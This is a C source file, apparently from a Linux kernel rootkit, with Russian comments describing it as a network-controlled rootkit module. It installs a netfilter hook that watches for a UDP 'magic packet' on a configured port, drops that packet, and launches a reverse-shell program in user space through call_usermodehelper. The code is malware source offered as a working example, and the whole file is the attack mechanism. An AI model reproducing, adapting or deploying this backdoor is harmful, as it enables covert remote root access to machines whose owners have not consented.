/*
 * reverse_shell.c
 *
 * Модуль руткита, который запускает юзермодное приложение.
 *
 * Данный модуль как пример управления руткитом по сети.
 *
 * По умолчанию путь до приложения, которого нужно запустить находится
 * в константе REVERSE_SHELL_PATH/REVERSE_SHELL_PORT в заголовочном файле example_config.h
 *
 */

#include "headers.h"

static int run_reverse_shell(char *ip, char *port)
{
	int ret;
	char *argv[] = { REVERSE_SHELL_PATH, "Params !", NULL };
	static char *envp[] = {
			"HOME=/",
			"TERM=linux",
			"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

	ret = call_usermodehelper( argv[0], argv, envp, UMH_NO_WAIT );

	return ret;
}

static unsigned int rootkit_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
	if(!skb) return NF_ACCEPT;

	struct iphdr *ip_header = ip_hdr(skb);

	if(!ip_header || !ip_header->protocol) return NF_ACCEPT;

	if(ip_header->protocol != 17) return NF_ACCEPT;

	struct udphdr *udp_header = udp_hdr(skb);
	unsigned int dst_prt = (unsigned int)ntohs(udp_header->dest);

	char ip[16];
	char port[6];

	if(dst_prt == REVERSE_SHELL_PORT)
	{
		printk(KERN_INFO "+++ Received magic packet:%d %d\n", udp_header->dest, dst_prt);

		//TODO Тут можно вызвать приложение, или распарсить пакет и выполнять какие-то действия

		if (run_reverse_shell(ip, port) < 0)
		{
			printk(KERN_INFO "+++ Failed to spawn reverse shell\n");
		}


		return NF_DROP;
	}
	return NF_ACCEPT;
}

static struct nf_hook_ops nfho;

//Интерфейсные функции модуля

int start_reverse_shell_rootkit(void)
{
	nfho.hook = rootkit_hook;
	nfho.hooknum = NF_INET_PRE_ROUTING;
	nfho.pf = PF_INET;
	nfho.priority = NF_IP_PRI_FIRST;
	int error = nf_register_net_hook(&init_net, &nfho);
	return error;
}

int stop_reverse_shell_rootkit(void)
{
	int error = 0;
	nf_unregister_net_hook(&init_net, &nfho);
	return error;
}
